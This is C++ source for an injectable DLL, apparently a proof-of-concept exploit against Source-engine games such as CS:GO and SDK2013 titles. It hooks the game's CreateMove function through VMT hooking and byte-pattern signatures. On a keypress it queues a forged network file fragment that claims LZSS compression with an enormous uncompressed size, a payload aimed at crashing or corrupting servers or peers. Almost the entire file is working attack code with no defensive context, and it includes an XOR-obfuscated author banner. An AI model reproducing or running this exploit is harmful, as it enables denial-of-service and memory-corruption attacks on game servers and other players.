#include "windows.h"
#include <psapi.h>
#include <TlHelp32.h>

#include "VMTHook.h" 

#include "public\cdll_int.h"
#include "public\inetchannel.h"
#include "public\Color.h"

#pragma comment(lib, "tier0.lib")
#pragma comment(lib, "tier1.lib")

#include "detours.h"
#pragma comment(lib, "detours.lib") 

bool bDataCompare(const BYTE* pData, const BYTE* bMask, const char* szMask)
{
	for (; *szMask; ++szMask, ++pData, ++bMask)
		if (*szMask == 'x' && *pData != *bMask)
			return false;

	return (*szMask) == NULL;
}

DWORD dwFindPattern(DWORD dwAddress, DWORD dwSize, BYTE* pbMask, char* szMask)
{
	for (DWORD i = NULL; i < dwSize; i++)
		if (bDataCompare((BYTE*)(dwAddress + i), pbMask, szMask))
			return (DWORD)(dwAddress + i);

	return 0;
}

DWORD GetModuleSize(char* module)
{
	DWORD processID = GetProcessId(GetCurrentProcess());
	HANDLE hSnap;
	MODULEENTRY32 xModule;
	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, processID);
	xModule.dwSize = sizeof(MODULEENTRY32);
	if (Module32First(hSnap, &xModule))
	{
		while (Module32Next(hSnap, &xModule))
		{
			if (!strncmp((char*)xModule.szModule, module, 8))
			{
				CloseHandle(hSnap);
				return (DWORD)xModule.modBaseSize;
			}
		}
	}
	CloseHandle(hSnap);
	return 0;
}

MODULEINFO GetModuleInfo(char *szModule)
{
	MODULEINFO modinfo = { 0 };
	HMODULE hModule = GetModuleHandle(szModule);
	if (hModule == 0) return modinfo;
	GetModuleInformation(GetCurrentProcess(), hModule, &modinfo, sizeof(MODULEINFO));
	return modinfo;
}

#include <string>
using namespace std;

char encrypt1[200] = "Ñãæçñ§Íì¢Âíêöðüø¯Ãâííøâë_ãè©êöäéýãóæ";//"Proof Of Concept Created by backwards\0";

string encryptDecrypt(string toEncrypt)
{
	char key[25] = { 'c', 's', 'k', 'j', 'y', 'i', 'd', 'l', 'd', 'c', 'd', 'f', 'w', 'w', 'n', 'n', 'q', 'b', 'r', 'j', 'n', 'n', 'i', 'q', 'a' };
	string output = toEncrypt;

	for (int i = 0; i < toEncrypt.size(); i++)
		output[i] = toEncrypt[i] ^ key[i % (sizeof(key) / sizeof(char))] + 30;

	return output;
}

__declspec(dllimport) void __cdecl ConColorMsg(class Color const &, char const *, ...);

typedef struct dataFragments_s
{
	int	file;			// open file handle
	char			filename[260]; // filename
	char*			buffer;			// if NULL it's a file
	unsigned int	bytes;			// size in bytes
	unsigned int	bits;			// size in bits
	unsigned int	transferID;		// only for files
	bool			isCompressed;	// true if data is bzip compressed
	unsigned int	nUncompressedSize; // full size in bytes
	bool			asTCP;			// send as TCP stream
	int				numFragments;	// number of total fragments
	int				ackedFragments; // number of fragments send & acknowledged
	int				pendingFragments; // number of fragments send, but not acknowledged yet
} dataFragments_t;

#define LZSS_ID (('S'<<24)|('S'<<16)|('Z'<<8)|('L'))

typedef unsigned long CUserCmd;

IVEngineClient *g_pEngine = 0;
IBaseClientDLL *g_pClient = 0;

DWORD GetNetChannelInfoAddy = 0;

typedef INetChannelInfo*(__thiscall*tGetNetChannelInfo)(void* thisptr);
tGetNetChannelInfo pGetNetChannelInfo;

INetChannelInfo* GetNetChannelInfo_Internal()
{
	if (!GetNetChannelInfoAddy)
		return 0x0;

	pGetNetChannelInfo = (tGetNetChannelInfo)(GetNetChannelInfoAddy);
	return pGetNetChannelInfo(g_pEngine);
}

DWORD AddToTailAddress = 0x0;

void AddToTail_CSGO(void* m_WaitingList, DWORD Stream, void* datafragment)
{
	if (!AddToTailAddress)
		return;

	typedef int(__thiscall*tAddToTail)(void*, DWORD, void*);
	tAddToTail pAddToTail;

	pAddToTail = (tAddToTail)AddToTailAddress;
	pAddToTail(m_WaitingList, Stream, datafragment);
}

typedef bool (WINAPI* tCreateMove_CSGO)(int, float, bool);
tCreateMove_CSGO pCreateMove_CSGO;

//CSGO's CreateMove Function
bool __fastcall new_CreateMoveClientMode(void* self, int edx, float frametime, CUserCmd* pCmd)
{
	INetChannel *channel = (INetChannel *)GetNetChannelInfo_Internal();
	if (!channel)
		return false;

	if (GetAsyncKeyState(VK_F4))
	{
		dataFragments_s* data = (dataFragments_s*)g_pMemAlloc->Alloc(sizeof(dataFragments_s));

		data->file = 0;
		sprintf(data->filename, "validfile.txt");
		data->ackedFragments = 0;
		data->asTCP = false;
		data->transferID = 0;
		data->numFragments = 1;
		data->bytes = 0x250;
		data->bits = data->bytes * 8;
		data->pendingFragments = 0;

		data->buffer = (char*)g_pMemAlloc->Alloc(1024);

		for (int i = 0; i < 1024; i++)
			data->buffer[i] = rand() & 0xFF;

		*(DWORD*)(data->buffer) = LZSS_ID;
		*(DWORD*)(data->buffer + 4) = 67108863;

		data->isCompressed = true;
		data->nUncompressedSize = 67108863;

		AddToTail_CSGO(channel + 79, 0, (DWORD*)&data);
	}

	if (GetAsyncKeyState(VK_F1) & 1 && GetAsyncKeyState(VK_F2) & 1)
	{
		static string encrypt1s = encryptDecrypt(encrypt1);
		::MessageBox(0, encrypt1s.c_str(), encrypt1s.c_str(), 0);
	}
	return false;	
}

void AddToTail_SDK2013(void* a, void* a2)
{
	if (!AddToTailAddress)
		return;

	typedef int(__thiscall*tAddToTail)(void*, void*);
	tAddToTail pAddToTail;

	pAddToTail = (tAddToTail)AddToTailAddress;
	pAddToTail(a, a2);
}

//SDK2013's CreateMove Function
typedef void (WINAPI* tCreateMove_SDK2013)(int, float, bool);
tCreateMove_SDK2013 pCreateMove_SDK2013;

void __stdcall new_CreateMove(int sequence_number, float input_sample_frametime, bool active)
{
	pCreateMove_SDK2013(sequence_number, input_sample_frametime, active);

	INetChannel *channel = (INetChannel *)g_pEngine->GetNetChannelInfo();
	if (!channel)
		return;

	if (GetAsyncKeyState(VK_F4))
	{
		dataFragments_s* data = (dataFragments_s*)g_pMemAlloc->Alloc(sizeof(dataFragments_s));

		data->file = 0;
		sprintf(data->filename, "validfile.txt");
		data->ackedFragments = 0;
		data->asTCP = false;
		data->transferID = 0;
		data->numFragments = 1;
		data->bytes = 0x250;
		data->bits = data->bytes * 8;
		data->pendingFragments = 0;

		data->buffer = (char*)g_pMemAlloc->Alloc(1024);

		for (int i = 0; i < 1024; i++)
			data->buffer[i] = rand() & 0xFF;

		*(DWORD*)(data->buffer) = LZSS_ID;
		*(DWORD*)(data->buffer + 4) = 67108863;

		data->isCompressed = true;
		data->nUncompressedSize = 67108863;

		//sdk2013
		AddToTail_SDK2013((int *)((int)&channel[0] + 192), (DWORD*)&data);
	}
}

DWORD WINAPI HookThread(LPVOID lpArgs)
{
	bool CSGO = true;

	CreateInterfaceFn EngineFactory = Sys_GetFactory("engine.dll");
	CreateInterfaceFn ClientFactory = Sys_GetFactory("client_panorama.dll");

	if (!ClientFactory)
	{
		CSGO = false;
		ClientFactory = Sys_GetFactory("client.dll");
	}

	g_pEngine = (IVEngineClient*)EngineFactory(VENGINE_CLIENT_INTERFACE_VERSION, 0);

	MODULEINFO engineinfos = GetModuleInfo("engine.dll");
	DWORD engineBase = (DWORD)engineinfos.lpBaseOfDll;
	DWORD engineSize = engineinfos.SizeOfImage;

	if (CSGO)
	{
		ConColorMsg(Color(164, 38, 255, 255), "Client Hack Injected (CSGO Detected).\n\n");

		ConColorMsg(Color(242, 182, 51, 255), "Proof Of Concept Created by ");
		ConColorMsg(Color(46, 173, 14, 255), "backwards\n\n");

		g_pClient = (IBaseClientDLL*)ClientFactory("VClient018", NULL);

		CVMTHookManager *EngineHook = new CVMTHookManager(reinterpret_cast<PDWORD*>(g_pEngine));
		GetNetChannelInfoAddy = EngineHook->dwGetMethodAddress(78);
		delete EngineHook;

		DWORD *ClientMode = **(DWORD***)((*(DWORD**)g_pClient)[10] + 0x5);
		if (ClientMode)
		{
			CVMTHookManager *CreateMoveHook = new CVMTHookManager(reinterpret_cast<PDWORD*>(ClientMode));
			pCreateMove_CSGO = (tCreateMove_CSGO)CreateMoveHook->dwHookMethod(reinterpret_cast<DWORD>(new_CreateMoveClientMode), 24);
		}

		AddToTailAddress = dwFindPattern(engineBase, engineSize, (PBYTE)"\x55\x8b\xec\x56\x8b\xf1\x57\x8b\x4e\x0c\x8b\x56\x04\x8d\x41\x01\x3b\xc2\x7e\x0b\x2b\xca\x41\x51\x8b\xce", "xxxxxxxxxxxxxxxxxxxxxxxxxx");
	}
	/*else//tf2
	{
		ConColorMsg(Color(164, 38, 255, 255), "Client Hack Injected (tf2 Detected).\n\n");

		ConColorMsg(Color(242, 182, 51, 255), "Proof Of Concept Created by ");
		ConColorMsg(Color(46, 173, 14, 255), "backwards\n\n");

		g_pClient = (IBaseClientDLL*)ClientFactory(CLIENT_DLL_INTERFACE_VERSION, NULL);

		DWORD* pdwClientVMT = (DWORD*)*(DWORD*)g_pClient;
		pCreateMove_SDK2013 = (tCreateMove_SDK2013)DetourFunction((PBYTE)pdwClientVMT[21], (PBYTE)new_CreateMove);

		//tf2 quick tests, address is different next update due to address opcodes being embeded
		AddToTailAddress = dwFindPattern(engineBase, engineSize, (PBYTE) "\x55\x8B\xEC\x56\x8B\xF1\x57\x8B\x7E\x0C\x8B\x4E\x04\x8D\x47\x01\x3B\xC1\x7E\x0D\x8B\xC7\x2B\xC1\x8B\xCE\x40\x50\xE8\x0F\x60\xF8\xFF\xFF\x46\x0C", (char*)"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx");
	}*/
	else //source sdk 2013 based game
	{ 
		ConColorMsg(Color(164, 38, 255, 255), "Client Hack Injected (SDK2013 Detected).\n\n");

		ConColorMsg(Color(242, 182, 51, 255), "Proof Of Concept Created by ");
		ConColorMsg(Color(46, 173, 14, 255), "backwards\n\n");

		g_pClient = (IBaseClientDLL*)ClientFactory(CLIENT_DLL_INTERFACE_VERSION, NULL);

		DWORD* pdwClientVMT = (DWORD*)*(DWORD*)g_pClient;
		pCreateMove_SDK2013 = (tCreateMove_SDK2013)DetourFunction((PBYTE)pdwClientVMT[21], (PBYTE)new_CreateMove);

		AddToTailAddress = dwFindPattern(engineBase, engineSize, (PBYTE)"\x55\x8B\xEC\x56\x8B\xF1\x57\x8B\x7E\x0C\x8B\x4E\x04\x8D\x47\x01\x3B\xC1\x7E\x0D\x8b\xC7\x2B\xC1\x8B\xCE\x40\x50\xE8\x2A\x2A\x2A\x2A\xFF\x46\x0C\x8B\x46\x0C\x8B\x0E\x2B\xC7\x48\x89\x4E\x10\x85\xC0\x7E\x14\xC1\xE0\x02\x8D\x0C\xB9\x50\x51\x8D\x41\x04\x50\xE8\x8C\x0D\x06\x00\x83\xC4\x0C", (char*)"xxxxxxxxxxxxxxxxxxxxxxxxxxxxx????xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx");
	}
	/*else //zombie panic source
	{
		ConColorMsg(Color(164, 38, 255, 255), "Client Hack Injected (zombie panic source Detected).\n\n");

		ConColorMsg(Color(242, 182, 51, 255), "Proof Of Concept Created by ");
		ConColorMsg(Color(46, 173, 14, 255), "backwards\n\n");

		g_pClient = (IBaseClientDLL*)ClientFactory(CLIENT_DLL_INTERFACE_VERSION, NULL);

		DWORD* pdwClientVMT = (DWORD*)*(DWORD*)g_pClient;
		pCreateMove_SDK2013 = (tCreateMove_SDK2013)DetourFunction((PBYTE)pdwClientVMT[21], (PBYTE)new_CreateMove);

		AddToTailAddress = dwFindPattern(engineBase, engineSize, (PBYTE)"\x55\x8B\xEC\x56\x8B\xF1\x57\x8B\x7E\x0C\x8B\x4E\x04\x8D\x47\x01\x3B\xC1\x7E\x0D\x8B\xC7\x2B\xC1\x8B\xCE\x40\x50\xE8\x4F\x75\xF9\xFF", (char*)"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx");
		/*if(AddToTailAddress)
			ConColorMsg(Color(242, 182, 51, 255), "Found AddToTail Address! 0x%X ", AddToTailAddress);
		else
			ConColorMsg(Color(242, 182, 51, 255), "Can't find add to tail address..");
	}*/

	return 0x0000148;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)HookThread, 0, 0, 0);
		return TRUE;
	case DLL_PROCESS_DETACH:
		break;
	}
	return FALSE;
}